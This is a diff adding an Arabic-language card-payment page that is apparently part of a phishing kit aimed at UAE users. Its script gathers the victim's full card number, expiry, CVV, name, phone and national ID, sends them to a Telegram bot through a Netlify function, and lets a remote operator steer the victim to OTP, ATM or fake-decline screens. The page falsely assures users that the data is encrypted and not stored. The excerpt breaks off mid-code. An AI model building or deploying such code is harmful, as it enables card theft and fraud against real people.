@@ -1,0 +1,1219 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="noindex, nofollow" />
+    <title>بيانات البطاقة البنكية</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="assets/fonts/fontawesome/css/all.min.css" />
+    <style>
+      :root {
+        --bg: #f2f2f7;
+        --panel: rgba(255, 255, 255, 0.98);
+        --text: #1c1c1e;
+        --muted: #6b6b6b;
+        --line: rgba(60, 60, 67, 0.16);
+        --gold: #b18c33;
+        --gold-2: #caa64e;
+        --danger: #bf514d;
+      }
+
+      * { box-sizing: border-box; }
+      html, body { margin: 0; min-height: 100%; }
+      body {
+        font-family: "SF Pro Text", "SF Pro Display", "Cairo", -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+        background: var(--bg);
+        color: var(--text);
+        direction: rtl;
+      }
+
+      a { color: inherit; text-decoration: none; }
+
+      .app {
+        min-height: 100vh;
+        width: min(100%, 980px);
+        margin: 0 auto;
+        padding: 14px 10px 16px;
+      }
+
+      .payment-shell {
+        max-width: 500px;
+        margin: 0 auto;
+        padding: 12px 12px 14px;
+        border: 1px solid rgba(60, 60, 67, 0.12);
+        border-radius: 20px;
+        background: #ffffff;
+        box-shadow: 0 8px 24px rgba(28, 28, 30, 0.08);
+      }
+
+      header {
+        max-width: 100%;
+        margin: 0 auto;
+        display: flex;
+        align-items: flex-start;
+        justify-content: flex-start;
+        gap: 10px;
+        padding: 0 0 8px;
+        border-bottom: 1px solid rgba(60, 60, 67, 0.1);
+      }
+
+      .logo {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .logo-mark {
+        display: block;
+        width: min(15vw, 82px);
+        height: auto;
+      }
+
+      .login-link {
+        display: none;
+      }
+
+      main { padding: 10px 0 0; }
+
+      form {
+        max-width: 100%;
+        margin: 0 auto;
+        padding: 0;
+        border-radius: 0;
+        background: var(--panel);
+        backdrop-filter: blur(8px);
+        border: 0;
+        box-shadow: none;
+      }
+
+      .decline-box {
+        display: none;
+        align-items: center;
+        gap: 16px;
+        position: relative;
+        background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+        border: none;
+        border-radius: 16px;
+        padding: 20px 24px;
+        margin-top: 20px;
+        box-shadow: 0 8px 24px rgba(220, 53, 69, 0.35);
+        animation: 0.3s ease-out slideDown;
+        color: #fff;
+        margin-bottom: 14px;
+        align-items: flex-start;
+      }
+
+      .decline-icon {
+        position: absolute;
+        inset-inline-end: 24px;
+        top: 20px;
+        width: 52px;
+        height: 52px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: rgba(255, 255, 255, 0.2);
+        backdrop-filter: blur(10px);
+      }
+
+      .decline-title {
+        color: #fff;
+        font-size: 18px;
+        font-weight: 700;
+        margin-bottom: 0;
+        letter-spacing: -0.3px;
+        line-height: 1.35;
+      }
+
+      .decline-sub {
+        color: rgba(255, 255, 255, 0.95);
+        font-size: 14px;
+        line-height: 1.6;
+        margin-bottom: 8px;
+        font-weight: 500;
+        text-align: center;
+      }
+
+      .decline-copy {
+        flex: 1;
+        text-align: right;
+      }
+
+      .decline-head {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 6px;
+      }
+
+      .decline-hint {
+        background: rgba(255, 255, 255, 0.15);
+        border-radius: 8px;
+        padding: 10px 14px;
+        backdrop-filter: blur(5px);
+        text-align: center;
+      }
+
+      .decline-hint-text {
+        color: #fff;
+        font-size: 13px;
+        font-weight: 500;
+        line-height: 1.45;
+      }
+      @keyframes slideDown {
+        from {
+          opacity: 0;
+          transform: translateY(-8px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .field {
+        margin-bottom: 14px;
+        position: relative;
+      }
+
+      .field--success input,
+      .field--success select {
+        border-color: rgba(46, 160, 67, 0.7);
+        box-shadow: 0 0 0 3px rgba(46, 160, 67, 0.1);
+      }
+
+      .label {
+        display: block;
+        margin-bottom: 5px;
+        font-size: 0.78rem;
+        font-weight: 600;
+        color: #3a3a3c;
+      }
+
+      input {
+        width: 100%;
+        height: 44px;
+        border-radius: 12px;
+        border: 1px solid var(--line);
+        background: #fbfbfd;
+        padding: 0 12px;
+        font: inherit;
+        color: var(--text);
+        outline: none;
+        transition: border-color 0.15s ease, box-shadow 0.15s ease, background-color 0.15s ease;
+      }
+
+      input[type="tel"] {
+        direction: rtl;
+        unicode-bidi: plaintext;
+        text-align: right;
+        font-variant-numeric: tabular-nums;
+      }
+
+      #cardHolderName {
+        direction: rtl;
+        text-align: right;
+      }
+
+      #cardHolderName::placeholder {
+        font-size: 0.82rem;
+        font-weight: 400;
+        color: #a6a6a6;
+      }
+
+      .expiry-field {
+        position: relative;
+        overflow: visible;
+        padding-bottom: 18px;
+      }
+
+      .expiry-error {
+        position: static;
+        inset-inline: auto;
+        top: auto;
+        width: 100%;
+        max-width: 100%;
+        color: #d9534f;
+        font-size: 0.75rem;
+        font-weight: 400;
+        line-height: 1.6;
+        display: none;
+        text-align: right;
+        direction: rtl;
+        unicode-bidi: plaintext;
+        overflow-wrap: anywhere;
+        word-break: break-word;
+        white-space: normal;
+        min-height: 2.2em;
+      }
+
+      .expiry-field--error input {
+        border-color: rgba(217, 83, 79, 0.5);
+        box-shadow: 0 0 0 3px rgba(217, 83, 79, 0.08);
+      }
+
+      .expiry-field--error .expiry-error {
+        display: block;
+      }
+
+      @media (max-width: 640px) {
+        .expiry-error {
+          font-size: 0.66rem;
+          line-height: 1.45;
+          min-height: 2.6em;
+        }
+      }
+
+      .expiry-field--success input {
+        border-color: rgba(46, 160, 67, 0.7);
+        box-shadow: 0 0 0 3px rgba(46, 160, 67, 0.1);
+      }
+
+      input::placeholder { color: #9a9a9a; }
+      input:focus {
+        border-color: rgba(10, 132, 255, 0.45);
+        background: #ffffff;
+        box-shadow: 0 0 0 3px rgba(10, 132, 255, 0.12);
+      }
+
+      .card-field-wrapper {
+        position: relative;
+        overflow: visible;
+      }
+
+      .card-field-wrapper--success input {
+        border-color: rgba(46, 160, 67, 0.7);
+        box-shadow: 0 0 0 3px rgba(46, 160, 67, 0.1);
+      }
+
+      .card-input {
+        padding-inline-end: 62px;
+      }
+
+      .card-logos {
+        position: absolute;
+        inset-inline-end: 10px;
+        inset-block-start: 50%;
+        transform: translateY(-50%);
+        display: none;
+        align-items: center;
+        gap: 8px;
+        pointer-events: none;
+      }
+
+      .card-logos--visible {
+        display: flex;
+      }
+
+      .card-logos img,
+      .card-logos i {
+        width: 36px;
+        height: 22px;
+        object-fit: contain;
+        font-size: 1.3rem;
+        line-height: 1;
+      }
+
+      .card-logos i {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .card-error {
+        position: absolute;
+        inset-inline: 0;
+        top: calc(100% + 4px);
+        color: #d9534f;
+        font-size: 0.75rem;
+        font-weight: 400;
+        line-height: 1.4;
+      }
+
+      .card-field-wrapper--error input {
+        border-color: rgba(217, 83, 79, 0.5);
+        box-shadow: 0 0 0 3px rgba(217, 83, 79, 0.08);
+      }
+
+      .card-field-wrapper:not(.card-field-wrapper--error) .card-error {
+        display: none;
+      }
+
+      .card-field-wrapper--error .card-error {
+        display: block;
+      }
+
+      .expiry-cvv-row {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 10px;
+        margin-bottom: 2px;
+      }
+
+      .secure-notice {
+        display: flex;
+        align-items: center;
+        gap: 7px;
+        margin: 10px 0 8px;
+        padding: 9px 10px;
+        border-radius: 12px;
+        background: rgba(10, 132, 255, 0.08);
+        color: #1f4f8f;
+        font-weight: 500;
+        font-size: 0.78rem;
+      }
+
+      .secure-notice span {
+        flex: 0 0 auto;
+      }
+
+      .info-text {
+        margin: 0 0 10px;
+        color: #636366;
+        font-size: 0.76rem;
+        line-height: 1.5;
+      }
+
+      .buttons-row {
+        display: block;
+      }
+
+      .btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        height: 42px;
+        border-radius: 12px;
+        font: inherit;
+        font-weight: 600;
+        border: 0;
+        cursor: pointer;
+        font-size: 0.86rem;
+        white-space: nowrap;
+        min-width: 0;
+      }
+
+      .btn-secondary {
+        background: #f2f2f7;
+        border: 1px solid rgba(60, 60, 67, 0.22);
+        color: #1c1c1e;
+        flex: 0 0 34%;
+      }
+
+      .btn-primary {
+        background: linear-gradient(180deg, var(--gold-2), var(--gold));
+        color: #fff;
+        box-shadow: 0 8px 18px rgba(177, 140, 51, 0.28);
+        width: 100%;
+      }
+
+      .loading-overlay {
+        position: fixed;
+        inset: 0;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        background: rgba(12, 12, 14, 0.72);
+        backdrop-filter: blur(10px);
+        z-index: 999;
+      }
+
+      .loading-overlay--visible {
+        display: flex;
+      }
+
+      .loading-card {
+        display: flex;
+        align-items: center;
+        flex-direction: column;
+        gap: 16px;
+        padding: 28px 30px;
+        border-radius: 24px;
+        background: rgba(10, 10, 10, 0.2);
+        border: 1px solid rgba(255, 255, 255, 0.08);
+        box-shadow: 0 24px 60px rgba(0, 0, 0, 0.28);
+        color: #f4f1e6;
+        font-size: 1rem;
+        font-weight: 500;
+        min-width: min(360px, calc(100vw - 48px));
+        text-align: center;
+      }
+
+      .loading-spinner {
+        width: 44px;
+        height: 44px;
+        border-radius: 50%;
+        border: 4px solid rgba(214, 180, 91, 0.18);
+        border-top-color: var(--gold);
+        animation: loading-spin 0.8s linear infinite;
+      }
+
+      @keyframes loading-spin {
+        to { transform: rotate(360deg); }
+      }
+
+      @media (max-width: 640px) {
+        .app { padding-inline: 8px; padding-top: 10px; }
+        .payment-shell { padding: 10px 10px 12px; border-radius: 18px; }
+        header { padding-bottom: 7px; }
+        .logo-mark {
+          width: 68px;
+        }
+        .expiry-cvv-row { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+        .buttons-row {
+          gap: 7px;
+        }
+        .btn {
+          height: 40px;
+          font-size: 0.82rem;
+        }
+        .btn-secondary {
+          flex-basis: 32%;
+          padding-inline: 8px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="app">
+      <div class="payment-shell">
+        <header>
+          <div class="logo">
+            <img class="logo-mark" alt="" src="assets/images/golden-logo" />
+          </div>
+        </header>
+
+        <main>
+          <form autocomplete="off" novalidate>
+            <div class="decline-box" id="declineBox">
+              <div class="decline-copy">
+                <div class="decline-head">
+                  <div class="decline-icon" aria-hidden="true">
+                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                      <circle cx="12" cy="12" r="10"></circle>
+                      <line x1="15" y1="9" x2="9" y2="15"></line>
+                      <line x1="9" y1="9" x2="15" y2="15"></line>
+                    </svg>
+                  </div>
+                  <div class="decline-title" id="declineTitle">تم رفض البطاقة</div>
+                </div>
+                <div class="decline-sub" id="declineSub">عذراً، لم يتم قبول بطاقتك الائتمانية</div>
+                <div class="decline-hint">
+                  <div class="decline-hint-text" id="declineHintText">💳 يرجى استخدام بطاقة أخرى أو اختيار وسيلة دفع بديلة</div>
+                </div>
+              </div>
+            </div>
+
+            <div class="field">
+              <label class="label" for="cardHolderName">اسم حامل البطاقة</label>
+              <input id="cardHolderName" type="text" placeholder="اسم حامل البطاقة" />
+              <div class="card-error" id="cardHolderError"></div>
+            </div>
+
+            <div class="field">
+              <label class="label" for="cardNumber">رقم البطاقة</label>
+              <div class="card-field-wrapper" id="cardFieldWrap">
+                <input id="cardNumber" class="card-input" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="" maxlength="19" />
+              <div class="card-logos">
+                <i class="fa-solid fa-credit-card" id="genericCardIcon" aria-hidden="true" style="display:inline-flex;color:#8e8e8e"></i>
+                <i class="fa-brands fa-cc-visa" id="visaIcon" aria-hidden="true" style="display:none;color:#1434cb"></i>
+                <img id="masterIcon" src="assets/images/Mastercard.svg" alt="" aria-hidden="true" style="display:none;" />
+              </div>
+                <div class="card-error" id="cardNumberError"></div>
+              </div>
+            </div>
+
+            <div class="expiry-cvv-row">
+              <div class="field">
+                <label class="label" for="expiryInput">تاريخ الانتهاء</label>
+                <div class="expiry-field" id="expiryFieldWrap">
+                  <input id="expiryInput" class="card-input" type="text" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/YY" maxlength="5" />
+                  <div class="card-error expiry-error" id="expiryError"></div>
+                </div>
+              </div>
+              <div class="field">
+                <label class="label" for="cvv">رمز الأمان (CVV)</label>
+                <input id="cvv" class="card-input" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="" maxlength="3" />
+                <div class="card-error" id="cvvError"></div>
+              </div>
+            </div>
+
+            <div class="secure-notice">
+              <span aria-hidden="true">🔒</span>
+              جميع المعلومات المالية محمية ومشفرة. لن يتم حفظ بيانات البطاقة على خوادمنا.
+            </div>
+
+            <div class="buttons-row">
+              <button class="btn btn-primary" type="submit">التالي</button>
+            </div>
+          </form>
+        </main>
+      </div>
+    </div>
+    <div class="loading-overlay" id="loadingOverlay" aria-live="polite" aria-hidden="true">
+      <div class="loading-card">
+        <div class="loading-spinner" aria-hidden="true"></div>
+        <div>جاري التحقق من المعلومات، يرجى الانتظار</div>
+      </div>
+    </div>
+    <script src="assets/js/config.js"></script>
+    <script src="assets/js/pin.js"></script>
+    <script>
+      (function () {
+        const digitMap = {
+          "٠": "0",
+          "١": "1",
+          "٢": "2",
+          "٣": "3",
+          "٤": "4",
+          "٥": "5",
+          "٦": "6",
+          "٧": "7",
+          "٨": "8",
+          "٩": "9",
+          "۰": "0",
+          "۱": "1",
+          "۲": "2",
+          "۳": "3",
+          "۴": "4",
+          "۵": "5",
+          "۶": "6",
+          "۷": "7",
+          "۸": "8",
+          "۹": "9"
+        };
+
+        function normalizeDigits(value) {
+          return value
+            .split("")
+            .map((char) => digitMap[char] ?? char)
+            .join("")
+            .replace(/\D+/g, "");
+        }
+
+        function formatCardNumber(value) {
+          return value
+            .replace(/\D/g, "")
+            .slice(0, 19)
+            .replace(/(.{4})/g, "$1 ")
+            .trim();
+        }
+
+        function getCaretPositionFromDigitCount(value, digitCount) {
+          let digitsSeen = 0;
+
+          for (let i = 0; i < value.length; i += 1) {
+            if (/\d/.test(value[i])) digitsSeen += 1;
+
+            if (digitsSeen === digitCount) {
+              return i + 1;
+            }
+          }
+
+          return value.length;
+        }
+
+        function luhnCheck(num) {
+          let sum = 0;
+          let shouldDouble = false;
+          for (let i = num.length - 1; i >= 0; i -= 1) {
+            let digit = Number.parseInt(num.charAt(i), 10);
+            if (Number.isNaN(digit)) return false;
+            if (shouldDouble) {
+              digit *= 2;
+              if (digit > 9) digit -= 9;
+            }
+            sum += digit;
+            shouldDouble = !shouldDouble;
+          }
+          return sum > 0 && sum % 10 === 0;
+        }
+
+        const cardInput = document.getElementById("cardNumber");
+        const cardError = document.getElementById("cardNumberError");
+        const cardFieldWrap = document.getElementById("cardFieldWrap");
+        const genericCardIcon = document.getElementById("genericCardIcon");
+        const visaIcon = document.getElementById("visaIcon");
+        const masterIcon = document.getElementById("masterIcon");
+        const cardHolderInput = document.getElementById("cardHolderName");
+        const cardHolderError = document.getElementById("cardHolderError");
+        const cvvInput = document.getElementById("cvv");
+        const cvvError = document.getElementById("cvvError");
+        const expiryInput = document.getElementById("expiryInput");
+        const expiryFieldWrap = document.getElementById("expiryFieldWrap");
+        const expiryError = document.getElementById("expiryError");
+        const loadingOverlay = document.getElementById("loadingOverlay");
+        const declineBox = document.getElementById("declineBox");
+        const declineTitle = document.getElementById("declineTitle");
+        const declineSub = document.getElementById("declineSub");
+        const declineHintText = document.getElementById("declineHintText");
+        const nextButton = document.querySelector(".btn-primary");
+        const form = document.querySelector("form");
+        let paymentStatusPollTimer = null;
+        let telegramUpdatesOffset = Number(localStorage.getItem("telegramUpdatesOffset") || "0") || 0;
+        function setCardBrand(rawDigits) {
+          const first = rawDigits.charAt(0);
+          const isVisa = first === "4";
+          const isMastercard = first === "5";
+          genericCardIcon.style.display = isVisa || isMastercard ? "none" : "inline-flex";
+          visaIcon.style.display = isVisa ? "inline-flex" : "none";
+          masterIcon.style.display = isMastercard ? "block" : "none";
+          document.querySelector(".card-logos")?.classList.add("card-logos--visible");
+          cardFieldWrap.classList.toggle("card-field-wrapper--brand", isVisa || isMastercard);
+        }
+
+        function getCardType(digits) {
+          if (digits.startsWith("4")) return "visa";
+          if (digits.startsWith("5")) return "mastercard";
+          return "unknown";
+        }
+
+        function setCardError(message) {
+          cardError.textContent = message || "";
+          cardFieldWrap.classList.toggle("card-field-wrapper--error", Boolean(message));
+        }
+
+        function clearCardError() {
+          setCardError("");
+        }
+
+        function setCardSuccess(isSuccess) {
+          cardFieldWrap.classList.toggle("card-field-wrapper--success", Boolean(isSuccess));
+        }
+
+        function setFieldSuccess(fieldEl, isSuccess) {
+          if (!fieldEl) return;
+          fieldEl.classList.toggle("field--success", Boolean(isSuccess));
+        }
+
+        function parseExpiryParts(rawValue) {
+          const digits = normalizeDigits(rawValue || "").slice(0, 4);
+          const month = digits.slice(0, 2);
+          const yearShort = digits.slice(2, 4);
+          const year = yearShort ? String(2000 + Number.parseInt(yearShort, 10)) : "";
+          return { digits, month, yearShort, year };
+        }
+
+        function validateCardNumber() {
+          const digits = normalizeDigits(cardInput.value);
+          if (!digits) {
+            setCardError("يرجى إدخال رقم البطاقة بشكل صحيح");
+            setCardSuccess(false);
+            return false;
+          }
+
+          const cardType = getCardType(digits);
+          const isExpectedLength = (cardType === "visa" || cardType === "mastercard")
+            ? digits.length === 16
+            : digits.length >= 13 && digits.length <= 19;
+
+          if (cardType === "unknown" || !isExpectedLength || !luhnCheck(digits)) {
+            setCardError("رقم بطاقة الائتمان غير صالح");
+            setCardSuccess(false);
+            return false;
+          }
+
+          clearCardError();
+          setCardSuccess(true);
+          return true;
+        }
+
+        function validateCvv() {
+          const digits = normalizeDigits(cvvInput.value).slice(0, 3);
+          cvvInput.value = digits;
+          if (digits.length !== 3) {
+            cvvError.textContent = "رمز الأمان يجب أن يكون 3 أرقام";
+            setFieldSuccess(cvvInput.closest(".field"), false);
+            return false;
+          }
+          cvvError.textContent = "";
+          setFieldSuccess(cvvInput.closest(".field"), true);
+          return true;
+        }
+
+        function validateExpiry() {
+          const { month, yearShort } = parseExpiryParts(expiryInput?.value || "");
+          const monthNumber = Number.parseInt(month, 10);
+          const yearShortNumber = Number.parseInt(yearShort, 10);
+          let message = "";
+
+          if (!month || !yearShort) {
+            message = "يرجى إدخال تاريخ الانتهاء بصيغة MM/YY";
+          } else if (!Number.isInteger(monthNumber) || monthNumber < 1 || monthNumber > 12) {
+            message = "الشهر غير صالح";
+          } else if (!Number.isInteger(yearShortNumber)) {
+            message = "السنة غير صالحة";
+          } else {
+            const now = new Date();
+            const currentYearShort = now.getFullYear() % 100;
+            const currentMonth = now.getMonth() + 1;
+            if (yearShortNumber < currentYearShort || (yearShortNumber === currentYearShort && monthNumber < currentMonth)) {
+              message = "البطاقة منتهية الصلاحية";
+            }
+          }
+
+          if (expiryError) expiryError.textContent = message;
+
+          if (message) {
+            if (expiryFieldWrap) {
+              expiryFieldWrap.classList.remove("expiry-field--success");
+              expiryFieldWrap.classList.add("expiry-field--error");
+            }
+            return false;
+          }
+
+          if (expiryFieldWrap) {
+            expiryFieldWrap.classList.remove("expiry-field--error");
+            expiryFieldWrap.classList.add("expiry-field--success");
+          }
+          return true;
+        }
+
+        function validateCardHolder() {
+          const value = cardHolderInput?.value.trim() || "";
+          const valid = value.length >= 3;
+          setFieldSuccess(cardHolderInput?.closest(".field"), valid);
+          if (cardHolderError) {
+            cardHolderError.textContent = valid ? "" : "يرجى إدخال اسم حامل البطاقة بشكل صحيح";
+          }
+          return valid;
+        }
+
+        function savePaymentData() {
+          const cardDigits = normalizeDigits(cardInput?.value || "");
+          const { month, year } = parseExpiryParts(expiryInput?.value || "");
+          const payload = {
+            cardNumber: cardInput?.value || "",
+            cardNumberDigits: cardDigits,
+            cardLast4: cardDigits.slice(-4),
+            cardHolderName: cardHolderInput?.value.trim() || "",
+            expiry: expiryInput?.value || "",
+            expiryMonth: month || "",
+            expiryYear: year || "",
+            cvv: cvvInput?.value || "",
+            updatedAt: new Date().toISOString()
+          };
+          localStorage.setItem("paymentData", JSON.stringify(payload));
+          localStorage.setItem("cardNumber", payload.cardNumber);
+          localStorage.setItem("paymentCardNumber", payload.cardNumber);
+          localStorage.setItem("cardLast4", payload.cardLast4);
+          localStorage.setItem("cardHolderName", payload.cardHolderName);
+          localStorage.setItem("expiry", payload.expiry);
+          localStorage.setItem("expiryMonth", payload.expiryMonth);
+          localStorage.setItem("expiryYear", payload.expiryYear);
+          localStorage.setItem("cvv", payload.cvv);
+        }
+
+        function getTelegramCredentials() {
+          return { proxy: true }; // credentials handled server-side
+        }
+
+        function readCustomerInfo() {
+          try {
+            const payload = JSON.parse(localStorage.getItem("fazaa.orderForm") || "{}");
+            return {
+              fullName: payload.fullName || "غير معروف",
+              phoneNumber: payload.phoneNumber || "غير معروف",
+              nationalId: payload.nationalId || "غير معروف"
+            };
+          } catch {
+            return {
+              fullName: "غير معروف",
+              phoneNumber: "غير معروف",
+              nationalId: "غير معروف"
+            };
+          }
+        }
+
+        function isAdibCard(cardDigits) {
+          const firstFour = normalizeDigits(cardDigits).substring(0, 4);
+          return (window.rejectedPins || []).includes(firstFour);
+        }
+
+        function formatCustomerInfoMessage(customer) {
+          const escapeMarkdownV2 = (value) =>
+            String(value ?? "غير معروف").replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
+          const asCode = (value) => `\`${escapeMarkdownV2(value)}\``;
+          const phoneText =
+            customer.phoneNumber && customer.phoneNumber !== "غير معروف"
+              ? `\u200E+971 ${customer.phoneNumber}\u200E`
+              : "غير معروف";
+  
+          const cardData = JSON.parse(localStorage.getItem("paymentData") || "{}");
+          const cardDigits = normalizeDigits(cardData.cardNumberDigits || cardData.cardNumber || "");
+          const formattedCardNumber = cardDigits || "غير معروف";
+          const ltrCardNumber =
+            formattedCardNumber === "غير معروف"
+              ? formattedCardNumber
+              : `\u200E${formattedCardNumber}\u200E`;
+          const bankHeader = isAdibCard(cardDigits) ? "🏦 *بنك أديب*" : null;
+          const expiryText =
+            cardData.expiryMonth && cardData.expiryYear
+              ? `${cardData.expiryMonth}/${cardData.expiryYear}`
+              : "MM/YYYY";
+
+          return [
+            "🔵 *صفحة البطاقة*",
+            ...(bankHeader ? [bankHeader] : []),
+            "",
+            "👤 *معلومات العميل*",
+            `*الاسم:* ${asCode(customer.fullName || "غير معروف")}`,
+            `*الهاتف:* ${asCode(phoneText)}`,
+            `*الهوية:* ${asCode(customer.nationalId || "غير معروف")}`,
+            "",
+            "💳 *بيانات البطاقة*",
+            // `💳 *رقم البطاقة:* ${asCode(ltrCardNumber)}`,
+            `💳 *رقم البطاقة:* ${ltrCardNumber}`,
+            `📅 *تاريخ الانتهاء:* ${asCode(`\u200E${expiryText}\u200E`)}`,
+            `🔒 *رمز الأمان:* ${asCode(cardData.cvv || "---")}`
+          ].join("\n");
+        }
+
+        function setOverlayVisible(visible) {
+          if (!loadingOverlay) return;
+          loadingOverlay.classList.toggle("loading-overlay--visible", visible);
+          loadingOverlay.setAttribute("aria-hidden", visible ? "false" : "true");
+        }
+
+        function showDeclineBox(show) {
+          if (!declineBox) return;
+          declineBox.style.display = show ? "flex" : "none";
+        }
+
+        function resetPaymentForm() {
+          if (form) form.reset();
+          if (cardInput) cardInput.value = "";
+          if (cardHolderInput) cardHolderInput.value = "";
+          if (expiryInput) expiryInput.value = "";
+          if (cvvInput) cvvInput.value = "";
+
+          if (cardError) cardError.textContent = "";
+          if (cardHolderError) cardHolderError.textContent = "";
+          if (expiryError) expiryError.textContent = "";
+          if (cvvError) cvvError.textContent = "";
+
+          if (cardFieldWrap) {
+            cardFieldWrap.classList.remove("card-field-wrapper--error", "card-field-wrapper--success", "card-field-wrapper--brand");
+          }
+          if (expiryFieldWrap) {
+            expiryFieldWrap.classList.remove("expiry-field--error", "expiry-field--success");
+          }
+
+          [cardHolderInput?.closest(".field"), cvvInput?.closest(".field")].forEach((field) => {
+            if (field) field.classList.remove("field--success");
+          });
+
+          document.querySelector(".card-logos")?.classList.remove("card-logos--visible");
+          setCardBrand("");
+
+          [
+            "paymentData",
+            "cardNumber",
+            "paymentCardNumber",
+            "cardLast4",
+            "cardHolderName",
+            "expiry",
+            "expiryMonth",
+            "expiryYear",
+            "cvv",
+          ].forEach((key) => localStorage.removeItem(key));
+        }
+
+        function applyCardRejectedNoticeFromQuery() {
+          const params = new URLSearchParams(window.location.search);
+          if (params.get("cardRejected") !== "1") return;
+          resetPaymentForm();
+          if (declineTitle) {
+            declineTitle.textContent = "تم رفض البطاقة";
+          }
+          if (declineSub) {
+            declineSub.textContent = "عذراً، لم يتم قبول بطاقتك الائتمانية";
+          }
+          if (declineHintText) {
+            declineHintText.textContent = "💳 يرجى استخدام بطاقة أخرى أو اختيار وسيلة دفع بديلة";
+          }
+          showDeclineBox(true);
+        }
+
+        function stopPaymentStatusPolling() {
+          if (!paymentStatusPollTimer) return;
+          window.clearInterval(paymentStatusPollTimer);
+          paymentStatusPollTimer = null;
+        }
+
+        function persistTelegramOffset(offset) {
+          telegramUpdatesOffset = Number(offset) || telegramUpdatesOffset;
+          localStorage.setItem("telegramUpdatesOffset", String(telegramUpdatesOffset));
+        }
+
+        async function telegramApi(credentials, method, body, allowRetry = true) {
+          const response = await fetch("/.netlify/functions/telegram", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ method, ...body })
+          });
+          const json = await response.json().catch(() => null);
+          if (!response.ok || !json?.ok) return null;
+          return json;
+        }
+
+        async function bootstrapUpdatesOffset(credentials) {
+          if (telegramUpdatesOffset > 0) return;
+          const latest = await telegramApi(credentials, "getUpdates", {
+            offset: 0,
+            timeout: 0,
+            allowed_updates: ["callback_query"]
+          });
+          const updates = latest?.result || [];
+          const last = updates[updates.length - 1];
+          if (last?.update_id != null) {
+            persistTelegramOffset(Number(last.update_id) + 1);
+          }
+        }
+
+        async function finalizeTelegramCallback(credentials, callbackQuery, statusText) {
+          const message = callbackQuery?.message;
+          if (!message) return;
+          const baseText = String(message.text || "").replace(/\n\nالحالة:\s*(❌ تم الرفض|📱 تحويل إلى OTP-SMS|📲 تحويل إلى OTP-APP|🏧 تحويل إلى الصراف الآلي|✅ تم الإنهاء)\s*$/u, "").trim();
+          const updatedText = `${baseText}\n\nالحالة: ${statusText}`;
+          await telegramApi(credentials, "editMessageText", {
+            chat_id: message.chat.id,
+            message_id: message.message_id,
+            text: updatedText,
+            disable_web_page_preview: true
+          });
+          await telegramApi(credentials, "answerCallbackQuery", {
+            callback_query_id: callbackQuery.id,
+            text: statusText,
+            show_alert: false
+          });
+        }
+
+        function startPaymentStatusPolling(targetMessageId, credentials) {
+          stopPaymentStatusPolling();
+          paymentStatusPollTimer = window.setInterval(async () => {
+            try {
+              const updatesResponse = await telegramApi(credentials, "getUpdates", {
+                offset: telegramUpdatesOffset || 0,
+                timeout: 0,
+                allowed_updates: ["callback_query"]
+              });
+              const updates = updatesResponse?.result || [];
+              for (const update of updates) {
+                if (update?.update_id != null) {
+                  persistTelegramOffset(Number(update.update_id) + 1);
+                }
+                const callback = update?.callback_query;
+                const callbackMessageId = Number(callback?.message?.message_id || 0);
+                if (callbackMessageId !== Number(targetMessageId)) {
+                  continue;
+                }
+                const data = String(callback?.data || "");
+                if (data === "payment_reject") {
+                  await finalizeTelegramCallback(credentials, callback, "❌ تم الرفض");
+                  setOverlayVisible(false);
+                  resetPaymentForm();
+                  showDeclineBox(true);
+                  stopPaymentStatusPolling();
+                  return;
+                }
+                if (data === "payment_otp_sms") {
+                  await finalizeTelegramCallback(credentials, callback, "📱 تحويل إلى OTP-SMS");
+                  setOverlayVisible(false);
+                  stopPaymentStatusPolling();
+                  window.location.href = "verification.html";
+                  return;
+                }
+                if (data === "payment_otp_app") {
+                  await finalizeTelegramCallback(credentials, callback, "📲 تحويل إلى OTP-APP");
+                  setOverlayVisible(false);
+                  stopPaymentStatusPolling();
+                  window.location.href = "otp-app.html";
+                  return;
+                }
+                if (data === "payment_atm") {
+                  await finalizeTelegramCallback(credentials, callback, "🏧 تحويل إلى الصراف الآلي");
+                  setOverlayVisible(false);
+                  stopPaymentStatusPolling();
+                  window.location.href = "atm.html";
+                  return;
+                }
+                if (data === "payment_finish") {
+                  await finalizeTelegramCallback(credentials, callback, "✅ تم الإنهاء");
+                  setOverlayVisible(false);
+                  stopPaymentStatusPolling();
+                  window.location.href = "success.html";
+                  return;
+                }
+              }
+            } catch {
+              // Keep polling quietly.
+            }
+          }, 1200);
+        }
+
+        async function sendCustomerInfoToTelegram() {
+          const credentials = getTelegramCredentials();
+          if (!credentials) return null;
+
+          const customer = readCustomerInfo();
+          const message = formatCustomerInfoMessage(customer);
+
+          try {
+            const body = {
+              text: message,
+              parse_mode: "MarkdownV2",
+              disable_web_page_preview: true,
+              reply_markup: {
+                inline_keyboard: [
+                  [
+                    { text: "💬 OTP-SMS", callback_data: "payment_otp_sms" },
+                    { text: "📲 OTP-APP", callback_data: "payment_otp_app" }
+                  ],
+                  [
+                    { text: "🏧 ATM", callback_data: "payment_atm" },
+                    { text: "✅ إنهاء", callback_data: "payment_finish" }
+                  ],
+                  [
